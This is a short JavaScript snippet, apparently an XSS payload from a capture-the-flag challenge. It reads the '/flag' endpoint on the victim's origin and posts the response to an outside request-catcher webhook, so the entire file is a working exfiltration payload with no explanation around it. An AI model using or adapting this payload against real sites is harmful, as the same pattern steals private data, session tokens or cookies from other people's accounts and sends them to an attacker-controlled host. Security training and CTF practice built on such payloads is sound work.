async function fetchFlagAndSendToWebhook(webhookUrl) {
  try {
    const response = await fetch('/flag', { referrerPolicy: 'origin' });
    const data = await response.text();
    console.log(data);

    const webhookResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ data })
    });
    console.log('Webhook response:', await webhookResponse.text());
  } catch (error) {
    console.error('Error:', error);
  }
}

fetchFlagAndSendToWebhook('https://xss.requestcatcher.com/test');
